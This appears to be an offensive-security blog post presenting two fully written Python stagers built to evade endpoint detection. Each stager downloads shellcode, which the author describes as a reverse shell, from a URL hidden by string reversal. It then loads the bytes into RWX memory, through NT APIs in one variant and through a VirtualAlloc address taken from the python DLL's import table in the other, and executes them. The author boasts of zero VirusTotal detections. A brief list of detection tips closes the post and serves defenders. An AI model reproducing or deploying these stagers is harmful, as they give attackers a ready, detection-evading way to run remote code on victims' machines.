---
title: Creative approaches to coding FUD Stagers
header:
  teaser: "/assets/images/fud.png"
categories:
  - FUD
tags:
  - Initial Access
  - Python
  - IAT
  - download and exec
  - FUD
  - Stager
  - Pentesting Payload
  - '2026'
  - g3tsyst3m
  - Initial Foothold
---

I have had several discussions over the years with folks on tackling EDR bypass as it pertains to fully undetected `(FUD)` code.  In my opinion, there isn't really a perfect silver bullet approach to tackling FUD.  Especially with ML (machine learning) / AI integrated in most modern EDR solutions, you really have to adjust your approach to FUD as you go.  I will say that I truly believe script interpreter type languages such as Python, Ruby, Perl, even PHP, are great candidates to meet this need.  Scripting languages are not heavily scrutinized when we're comparing with compiled (PE executable) code.  Now I can already hear the disgruntled offsec folks questioning my rationale when they have tried countless times to make their powershell and javascript/vbscript code into FUD worthy code.  I get it and I'm with you.  It's not a one size fits all right?  Powershell, while also a script interpreter type language, has been so abused by threat actors that it's incredibly difficult to tackle FUD due to its prolific use in malicious campaigns, but it's certainly not impossible.  Let's get to it!

FUD Stager Variant #1
-

**High Level Overview for The First Stager Concept**


- Construct a URL via string reversal to obscure its destination (SCODE_U[::-1])
- Download raw shellcode from that URL
- Allocate RWX memory via NtAllocateVirtualMemory (NT-layer to dodge API monitoring)
- Copy shellcode into that region
- Execute it via NtCreateThreadEx, evasion-motivated
- API names are obfuscated via string reversal throughout the code (_api, _api2, etc.)

**In brief:** This is a simple dropper/stager that downloads and executes shellcode in-memory, and avoids writing anything to disk.

Part 1 - Bypassing Static Analysis Overview
-

The initial approach I usually take is to use simple yet effective techniques to help prevent familiar static analysis detection.  For starters, I want to:

- Avoid string detection for APIs we will use in the code
- Rename and/or shorten the name of familiar offsec terms used throughout our code like shellcode -> scode, download shellcode -> dwnlod_scode, and so on.
- Reverse our variable names and other strings used in our code and correct them at time of execution
  - **_api** = "yromeMlautriVetacollAtN"
  - **SCODE_U** = "onyd.ger/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"

**Why string detection matters**

Most static analysis engines, whether signature-based or ML-assisted, are doing some form of token scoring. Strings like `VirtualAlloc`, `CreateThread`, `NtAllocateVirtualMemory`, and `shellcode` carry heavy malicious weight in any trained model. They show up constantly in malware samples, so their mere presence pushes a file's score upward fast. The goal isn't to be invisible, it's to stay below the threshold that triggers a block or quarantine action.

Reversing our API strings and resolving them at runtime is about as low-effort as obfuscation gets, and I like low effort code. 😈  It works because static analysis by definition can't execute your code to unwind it. An engine scanning bytes on disk sees `"yromeMlautriVetacollAtN"` — an unrecognized string that scores essentially zero on its own. 😸

**Variable names Matter!**

This one is almost embarrassingly simple, but don't underestimate it. Variable names, function names, and comments all end up as strings in your source or bytecode. A function called download_shellcode is a gift to any analyst or automated scanner. dwnlod_scode isn't clever enough to fool a human analyst for long, but you're not trying to fool a human analyst at static analysis time — you're trying to slip past automated pre-execution scoring.

Part 2 - Downloading the Shellcode in Memory
-

```python
SCODE_U = "onyd.ger/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"  
SCODE_U = SCODE_U[::-1]
def dwnlod_scode(url):
    try:
        response = requests.get(url, stream=True)  # Stream for large files 
        response.raise_for_status()
        shel_ly = b''.join(response.iter_content(chunk_size=4096))  # Load fully into bytes
        print(f"[+] Dwnlded {len(shel_ly)} bytes of scode")
        return shel_ly
    except Exception as e:
        print(f"[-] Dwnld failed: {e}")
        return None
```

In the code above is pretty straightforward.  My shellcode is located in a file that resides on my Github repo and I've reversed the URL string to thwart static analysis efforts.  I've also renamed the file extension to something random, in this case `.dyno` as that is not a typical windows file extension and it will not receive as much scrutiny as say a `.bin` file extension.  Finally, we return the bytes of the shellcode we just downloaded in the shel_ly variable. 

Part 3 - Eggsecuting Shellcode in Memory 🥚
-

I always like to keep things simple to start, just to see how much I can get away with before detection 😸  In this case, I was able to avoid using advanced methods such as Syscalls and/or further advanced techniques to inject our shellcode and the code remained undetected.  I didn't keep things so simple as to still use the basic kernel32 APIs though. 😏  Instead, we will be making use of the low level NT APIs to help increase our chances of success as far as code exection without detection.

> Here's how everything is laid out in the `eggsecute_scode` function:

**Obfuscated Windows API calls**

Our code uses string reversal once again to hide the real API names from simple string scanners:

- "eldnaHesolC"[::-1] → CloseHandle
- "tcejbOelgniSroFtiaW"[::-1] → WaitForSingleObject
- "yromeMlautriVetacollAtN"[::-1] → NtAllocateVirtualMemory
- "xEdaerhTetaerCtN"[::-1] → NtCreateThreadEx
- "evommem"[::-1] → memmove

**Allocating executable memory using NT APIs**

We use `NtAllocateVirtualMemory` (our low-level kernel32 API equivalent from ntdll) to request a block of memory in the current process with these familiar permissions:

> MEM_COMMIT | MEM_RESERVE
> 
> PAGE_EXECUTE_READWRITE (RWX — readable, writable, and executable)

This is as basic as it gets as far as demonstrating a classic allocation of RWX memory

**Copy the shellcode into memory and Execute it!**

We now use memmove to copy the previously downloaded shellcode bytes directly into the newly allocated executable memory region.  Finally, as is typical in standard shellcode execution convention, we create a thread to run our shellcode.

We will use the low level `NtCreateThreadEx` API to spawn a new thread inside our current process, with the starting address set to the beginning of the shellcode. Lastly, we wait up to 10 seconds for the thread to finish (`WaitForSingleObject`) and then close the thread handle.

Here's what that entire function looks like in terms of code:

```python
def eggsecute_scode(scode2):
    # Constants
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    
    _api4 = "eldnaHesolC"
    closingtime = getattr(kernel32, _api4[::-1])
    
    closingtime.restype = wintypes.DWORD
    closingtime.argtypes = [
    wintypes.HANDLE,  # hHandle
    ]
    
    _api3 = "tcejbOelgniSroFtiaW"
    waitinaround = getattr(kernel32, _api3[::-1])
    
    waitinaround.restype = wintypes.DWORD
    waitinaround.argtypes = [
    wintypes.HANDLE,  # hHandle
    wintypes.DWORD,   # dwMilliseconds
    ]
    
    _api = "yromeMlautriVetacollAtN"  # 
    Allocator = getattr(ntdll, _api[::-1])
    
    Allocator.restype = wintypes.BOOL
    Allocator.argtypes = [
    wintypes.HANDLE,
    ctypes.POINTER(wintypes.LPVOID),
    ctypes.c_void_p,
    ctypes.POINTER(ctypes.c_size_t),
    wintypes.DWORD,
    wintypes.DWORD,
    ]
    
    _api2 = "xEdaerhTetaerCtN"
    thred_the_needle = getattr(ntdll, _api2[::-1])
    
    thred_the_needle.restype = wintypes.LONG  # NTSTATUS
    thred_the_needle.argtypes = [
    ctypes.POINTER(wintypes.HANDLE),   # ThredHandel (out)
    ctypes.c_ulong,                    # DesiredAccess
    ctypes.c_void_p,                   # ObjectAttributes
    wintypes.HANDLE,                   # ProcessHandle
    ctypes.c_void_p,                   # StartRoutine (your scode addr)
    ctypes.c_void_p,                   # Argument
    ctypes.c_ulong,                    # CrateFlags (0 = run immediately)
    ctypes.c_size_t,                   # ZeroBits
    ctypes.c_size_t,                   # StackSize
    ctypes.c_size_t,                   # MaximumStackSize
    ctypes.c_void_p,                   # AttributeList
]
    
    addr = wintypes.LPVOID(0)
    size = ctypes.c_size_t(len(scode2))
    current_process = wintypes.HANDLE(-1)
    status = Allocator(
        current_process,
        ctypes.byref(addr),
        0,
        ctypes.byref(size),
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )
    
    if status == 0:  # NTSTATUS 0 = success
        mem_addr = addr.value
        print(f"[+] Allcted mem at: 0x{mem_addr:x}")
        
        _api0 = "evommem"  
        m3mMov3r = getattr(ctypes, _api0[::-1])
        
        m3mMov3r(mem_addr, scode2, len(scode2))
        print("[+] Scode copied to memory")
        
        h_thread = wintypes.HANDLE(0)
        status2 = thred_the_needle(
        ctypes.byref(h_thread),
        0x1FFFFF,                          # THRED_ALL_ACCESS
        None,
        current_process,
        ctypes.cast(mem_addr, ctypes.c_void_p),  # scode start address
        None,
        0,                                 # no flags, start immediately
        0,
        0,
        0,
        None
        )
        
        if status2 == 0:
            print(f"[+] Thredded Needle!")
            
            waitinaround(h_thread.value, 10000)
            closingtime(h_thread.value)
        else:
            print(f"[-] thred_the_needle failed: {hex(status2 & 0xFFFFFFFF)}")
            
    else:
        print(f"[-] Allocator failed (NTSTATUS: 0x{status:08X})")
```

Bringing it all together
-

> Code Execution:

<img width="1481" height="429" alt="image" src="https://github.com/user-attachments/assets/d9899ae8-7079-4007-942d-26135440cadd" />

> Reverse Shell:

<img width="760" height="379" alt="image" src="https://github.com/user-attachments/assets/ea5ae0f7-bb5e-44f0-bdb0-912e61e64215" />

For just `135` lines of code, we were able to accomplish a very effective means of executing shellcode in memory without detection.  Want to see how effective?  See for yourself.  At the time of my submission/analysis, this achieved a **0/63** on VirusTotal.  In other words: **FUD achieved!**

hash lookup: **27e51de6e6a555bc622a3769ee030bfd92079022780ca8bb33958479562dfc6e**

[https://www.virustotal.com/gui/file/27e51de6e6a555bc622a3769ee030bfd92079022780ca8bb33958479562dfc6e](https://www.virustotal.com/gui/file/27e51de6e6a555bc622a3769ee030bfd92079022780ca8bb33958479562dfc6e)
<img width="1768" height="849" alt="image" src="https://github.com/user-attachments/assets/72567e23-ff3d-42ec-a64c-9aaee18109c3" />

> **Full Source Code:**

```python
#27e51de6e6a555bc622a3769ee030bfd92079022780ca8bb33958479562dfc6e


import requests
import ctypes
from ctypes import wintypes

SCODE_U = "onyd.ger/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"  
SCODE_U = SCODE_U[::-1]
def dwnlod_scode(url):
    try:
        response = requests.get(url, stream=True)  # Stream for large files 
        response.raise_for_status()
        shel_ly = b''.join(response.iter_content(chunk_size=4096))  # Load fully into bytes
        print(f"[+] Dwnlded {len(shel_ly)} bytes of scode")
        print(shel_ly)
        return shel_ly
    except Exception as e:
        print(f"[-] Dwnld failed: {e}")
        return None

def eggsecute_scode(scode2):
    # Constants
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    
    _api4 = "eldnaHesolC"
    closingtime = getattr(kernel32, _api4[::-1])
    
    closingtime.restype = wintypes.DWORD
    closingtime.argtypes = [
    wintypes.HANDLE,  # hHandle
    ]
    
    _api3 = "tcejbOelgniSroFtiaW"
    waitinaround = getattr(kernel32, _api3[::-1])
    
    waitinaround.restype = wintypes.DWORD
    waitinaround.argtypes = [
    wintypes.HANDLE,  # hHandle
    wintypes.DWORD,   # dwMilliseconds
    ]
    
    _api = "yromeMlautriVetacollAtN"  # 
    Allocator = getattr(ntdll, _api[::-1])
    
    Allocator.restype = wintypes.BOOL
    Allocator.argtypes = [
    wintypes.HANDLE,
    ctypes.POINTER(wintypes.LPVOID),
    ctypes.c_void_p,
    ctypes.POINTER(ctypes.c_size_t),
    wintypes.DWORD,
    wintypes.DWORD,
    ]
    
    _api2 = "xEdaerhTetaerCtN"
    thred_the_needle = getattr(ntdll, _api2[::-1])
    
    thred_the_needle.restype = wintypes.LONG  # NTSTATUS
    thred_the_needle.argtypes = [
    ctypes.POINTER(wintypes.HANDLE),   # ThredHandel (out)
    ctypes.c_ulong,                    # DesiredAccess
    ctypes.c_void_p,                   # ObjectAttributes
    wintypes.HANDLE,                   # ProcessHandle
    ctypes.c_void_p,                   # StartRoutine (your scode addr)
    ctypes.c_void_p,                   # Argument
    ctypes.c_ulong,                    # CrateFlags (0 = run immediately)
    ctypes.c_size_t,                   # ZeroBits
    ctypes.c_size_t,                   # StackSize
    ctypes.c_size_t,                   # MaximumStackSize
    ctypes.c_void_p,                   # AttributeList
]
    
    addr = wintypes.LPVOID(0)
    size = ctypes.c_size_t(len(scode2))
    current_process = wintypes.HANDLE(-1)
    status = Allocator(
        current_process,
        ctypes.byref(addr),
        0,
        ctypes.byref(size),
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )
    
    if status == 0:  # NTSTATUS 0 = success
        mem_addr = addr.value
        print(f"[+] Allcted mem at: 0x{mem_addr:x}")
        
        _api0 = "evommem"  
        m3mMov3r = getattr(ctypes, _api0[::-1])
        
        m3mMov3r(mem_addr, scode2, len(scode2))
        print("[+] Scode copied to memory")
        
        h_thread = wintypes.HANDLE(0)
        status2 = thred_the_needle(
        ctypes.byref(h_thread),
        0x1FFFFF,                          # THRED_ALL_ACCESS
        None,
        current_process,
        ctypes.cast(mem_addr, ctypes.c_void_p),  # scode start address
        None,
        0,                                 # no flags, start immediately
        0,
        0,
        0,
        None
        )
        
        if status2 == 0:
            print(f"[+] Thredded Needle!")
            
            waitinaround(h_thread.value, 10000)
            closingtime(h_thread.value)
        else:
            print(f"[-] thred_the_needle failed: {hex(status2 & 0xFFFFFFFF)}")
            
    else:
        print(f"[-] Allocator failed (NTSTATUS: 0x{status:08X})")

if __name__ == "__main__":
    print("[*] Dwnlding scode from URL...")
    scode = dwnlod_scode(SCODE_U)
    if scode:
        print("[*] Eggsecuting Scode in mem...")
        eggsecute_scode(scode)
    else:
        print("[-] Aborting.")
```

FUD Stager Variant #2
-

**High Level Overview**

Let's take another creative approach to building our FUD stager. Rather than calling VirtualAlloc directly, we'll leverage the already-loaded python314.dll — parsing its in-memory PE structure to walk the IAT and extract the live runtime address of VirtualAlloc as imported from kernel32.dll. No direct API call. No obvious import. Just borrowing what Python already loaded for us.  It's also worth mentioning this is assuming you use a portable version of python to load your script.  It would work with `py2exe` as well, but we're trying to avoid use of executable files in this case.  The python executable itself is an exception 😸

**In short**: The resolved IAT address becomes a typed function pointer, giving us direct access to `VirtualAlloc` without ever naming it explicitly or having to look its memory address up manually via traditional methods (`GetProcAddress`, etc).  This once again helps aid us greatly in deterring static analysis efforts from EDR.

Part 1 - The Familiar Downloader
-

Our code this time starts out in a familiar fashion as our last FUD code.  We download our reverse shell shellcode bytes into memory.  We will also be reversing our URL string again and changing variables from their familiar descriptors (shellcode, etc) to a less revealing name, like `SCODE_U` (shellcode url 😄).  

```python
import ctypes, sys, os
import requests

try:
    import pefile
except ImportError:
    print("pip install pefile"); sys.exit(1)

SCODE_U = "onyd.ger/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
SCODE_U = SCODE_U[::-1]

def dwnlod_scode(url):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        shel_ly = b''.join(response.iter_content(chunk_size=4096))
        print(f"[+] Downloaded {len(shel_ly)} bytes")
        return shel_ly
    except Exception as e:
        print(f"[-] Download failed: {e}"); return None
```

Part 2 - Setup our functions for Copying and Executing the Downloaded Shellcode
-

We also need to go over the copying of our shellcode bytes into our soon to be allocated memory address and the executing of the shellcode.  Let's do that now. 

```python
def copy_to_page(page: int, scode: bytes) -> bool:
    """Copy scode bytes into the RWX page via ctypes.memmove."""
    if not page:
        print("[-] Invalid page address"); return False
    if len(scode) > 0x1000:
        print(f"[-] Scode too large ({len(scode)} > 0x1000)"); return False

    # memmove(dst, src, count)
    # dst = raw integer address of our RWX page
    # src = scode bytes (ctypes accepts bytes directly as src)
    ctypes.memmove(page, scode, len(scode))
    print(f"[+] Copied {len(scode)} bytes → 0x{page:016x}")
    return True

def exec_page(page: int):
    """Cast the page to a void(*)(void) and call it."""
    thunk = ctypes.WINFUNCTYPE(None)(page)
    print(f"[+] Executing scode @ 0x{page:016x}")
    thunk()
```

Part 3- Walking the IAT and locating the already loaded `VirtualAlloc` memory address!
-

> Phase 1 — We will build out the DLL name and path dynamically

```python
ver      = sys.version_info
dll_name = f"python{ver.major}{ver.minor}.dll"
dll_path = os.path.join(os.path.dirname(sys.executable), dll_name)
```

The first part of our code constructs `python314.dll` (or whatever version you are running) without hardcoding it. `dll_path` points to the on-disk copy needed for PE parsing. This is also nice because it is version-agnostic and works across all Python releases without modification.

> Phase 2 — We get the live in-memory base address of our `python314.dll` 

```python
k32 = ctypes.windll.kernel32
k32.GetModuleHandleW.restype  = ctypes.c_void_p
k32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
base = k32.GetModuleHandleW(dll_name)
```

We explicitly set the return type to `c_void_p` so ctypes doesn't truncate the 64-bit address. `GetModuleHandleW` returns the base address of our already-loaded module.  In other words: no disk load, no new mapping. Since Python is running, python314.dll is guaranteed to be resident in memory.

> Phase 3 — We need to parse the on-disk PE structure

```python
pe = pefile.PE(dll_path, fast_load=False)
pe.parse_data_directories()
```

We will read the on-disk copy of `python314.dll` purely for its layout.  This includes section headers, import directory offsets, and ImageBase. 

fast_load=False + parse_data_directories() ensures the full import table is available. 

> Phase 4 — Walk the IAT and resolve the live pointer

```python
memprep = b"collAlautriV"   # "VirtualAlloc" reversed
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    if b'kernel32' in entry.dll.lower():
        for imp in entry.imports:
            if imp.name == memprep[::-1]:
                slot  = base + imp.address - pe.OPTIONAL_HEADER.ImageBase
                va_va = ctypes.c_uint64.from_address(slot).value
```

Part 4 - Cast and Execute!
-

Lastly, this code snippet filters to kernel32.dll imports only.  We then match against b"VirtualAlloc", without that string ever appearing in plaintext.

`imp.address` is the on-disk VA of the IAT slot.  Subtracting `pe.OPTIONAL_HEADER.ImageBase` converts it to an RVA.  Adding base converts the RVA to the actual runtime address of the slot.

and Finally!  `c_uint64.from_address(slot).value` dereferences that previously mentioned slot.  We then read the 8-byte pointer the loader wrote there at startup, giving us the true runtime address of VirtualAlloc 😸  Phew!  Well, there you have it.

The resulting `va_va` is the live, post-ASLR, post-loader-resolution address of `VirtualAlloc`, ready to be cast to a callable.  Let's do that now!

```python
MemoryAllocator = ctypes.WINFUNCTYPE(
    ctypes.c_void_p,
    ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_uint32, ctypes.c_uint32
)(va_va) # <--here's where we cast it

page = MemoryAllocator(None, 0x1000, 0x3000, 0x40)
print(f"[+] RWX page @ 0x{page:016x}" if page else f"[-] failed (GLE={k32.GetLastError()})")

if page:
    print("[+] allocated!")
```

Finally, call the copy and execute functions:

```python
# ── execution ─────────────────────────────────────────────────────────────────────
scode = dwnlod_scode(SCODE_U)
if scode:
    # page = your VAlloc result from earlier
    if copy_to_page(page, scode):
        exec_page(page)
        
    # ── cleanup (only reached if shellcode returns) ───────────────────────────────
    k32.VirtualFree(ctypes.c_void_p(page), 0, 0x8000)
    print("[*] freed")
```

**Here's a sneak preview of the finished product:**

<img width="732" height="232" alt="image" src="https://github.com/user-attachments/assets/0cfcda18-86f3-47a5-91b7-65f911c16b34" />

<img width="673" height="228" alt="image" src="https://github.com/user-attachments/assets/0535905c-9521-4137-8cb8-918135adb93f" />

**VirusTotal Results 💊**

**Hash: 6c2a91f23724a8605312bff1d629f92a7a88e78d947e79da5e403338f4eefeb6** 

[https://www.virustotal.com/gui/file/6c2a91f23724a8605312bff1d629f92a7a88e78d947e79da5e403338f4eefeb6](https://www.virustotal.com/gui/file/6c2a91f23724a8605312bff1d629f92a7a88e78d947e79da5e403338f4eefeb6)

<img width="1717" height="765" alt="image" src="https://github.com/user-attachments/assets/8cd1a555-aa50-4539-bcde-ca5bc1ee5506" />

> **And the full source code for FUD variant #2:**

```python
#6c2a91f23724a8605312bff1d629f92a7a88e78d947e79da5e403338f4eefeb6

import ctypes, sys, os
import requests

try:
    import pefile
except ImportError:
    print("pip install pefile"); sys.exit(1)

SCODE_U = "onyd.ger/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
SCODE_U = SCODE_U[::-1]

def dwnlod_scode(url):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        shel_ly = b''.join(response.iter_content(chunk_size=4096))
        print(f"[+] Downloaded {len(shel_ly)} bytes")
        return shel_ly
    except Exception as e:
        print(f"[-] Download failed: {e}"); return None

def copy_to_page(page: int, scode: bytes) -> bool:
    """Copy scode bytes into the RWX page via ctypes.memmove."""
    if not page:
        print("[-] Invalid page address"); return False
    if len(scode) > 0x1000:
        print(f"[-] Scode too large ({len(scode)} > 0x1000)"); return False

    # memmove(dst, src, count)
    # dst = raw integer address of our RWX page
    # src = scode bytes (ctypes accepts bytes directly as src)
    ctypes.memmove(page, scode, len(scode))
    print(f"[+] Copied {len(scode)} bytes → 0x{page:016x}")
    return True

def exec_page(page: int):
    """Cast the page to a void(*)(void) and call it."""
    thunk = ctypes.WINFUNCTYPE(None)(page)
    print(f"[+] Executing scode @ 0x{page:016x}")
    thunk()

ver      = sys.version_info
dll_name = f"python{ver.major}{ver.minor}.dll"
dll_path = os.path.join(os.path.dirname(sys.executable), dll_name)

k32 = ctypes.windll.kernel32
k32.GetModuleHandleW.restype  = ctypes.c_void_p     
k32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
base = k32.GetModuleHandleW(dll_name)
print(f"[*] {dll_name} @ 0x{base:016x}")

pe = pefile.PE(dll_path, fast_load=False)
pe.parse_data_directories()

memprep=b"collAlautriV"
va_va = 0
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    if b'kernel32' in entry.dll.lower():
        for imp in entry.imports:
            if imp.name == memprep[::-1]:
                slot  = base + imp.address - pe.OPTIONAL_HEADER.ImageBase
                va_va = ctypes.c_uint64.from_address(slot).value
                break

if not va_va:
    print("[-] collAlautriV not found in IAT"); sys.exit(1)
print(f"[+] collAlautriV @ 0x{va_va:016x}")

MemoryAllocator = ctypes.WINFUNCTYPE(
    ctypes.c_void_p,
    ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_uint32, ctypes.c_uint32
)(va_va)

page = MemoryAllocator(None, 0x1000, 0x3000, 0x40)
print(f"[+] RWX page @ 0x{page:016x}" if page else f"[-] failed (GLE={k32.GetLastError()})")

if page:
    print("[+] allocated!")

# ── execution ─────────────────────────────────────────────────────────────────────
scode = dwnlod_scode(SCODE_U)
if scode:
    # page = your VAlloc result from earlier
    if copy_to_page(page, scode):
        exec_page(page)
        
    # ── cleanup (only reached if shellcode returns) ───────────────────────────────
    k32.VirtualFree(ctypes.c_void_p(page), 0, 0x8000)
    print("[*] freed")
```

***Bonus Content for Members! (All Membership Tiers)***
-

📹 In-Depth Video/Audio Walkthrough for today's blog post: [In-Depth Video Walkthrough](https://ko-fi.com/s/3e9d57ce10)

🗒️ Packaged .zip file containing portable python + Source Code to go with the Video: [Portable Python + code](https://ko-fi.com/s/3e9d57ce10)

🛡️ **Dynamic Analysis Detection Tips** 🛡️

- Flag `python.exe` when allocating RWX memory at runtime.  I'd say most legitimate Python workloads almost never do this 😆
- ETW Microsoft-Windows-Threat-Intelligence provider alerts on ALLOCVM events with execute permissions from interpreter processes
- Detect execution originating from private, non-image-backed memory regions 
- Alert on python.exe making outbound network connections followed by memory allocation and execution in the same process lifetime
- Monitor for python-requests User-Agent strings
- Flag `NtAllocateVirtualMemory` and/or `NtCreateThreadEx` calls from python interpreter processes.  Honestly, NT API usage from Python is highly anomalous
- Sandbox detonation of unknown .py files with full API call tracing — reversed strings unwind at runtime and become visible in dynamic traces even when invisible statically
- Alert on python.exe with no parent console or GUI context making network calls
- Detect pefile import activity at runtime.  Parsing a PE from within a running Python process is unusual behavior outside of explicit reverse engineering tooling
- Memory scanning on execute-permission regions mid-execution.  Shellcode signatures that evade static scanning are often detectable in-memory after decoding

And that's a wrap folks!  Thanks and see you on the next blog post!

~G3tSyst3m

<div style="text-align: right;">
  
<b>Sponsored By:</b><br>

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png" />

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png" />

</div>
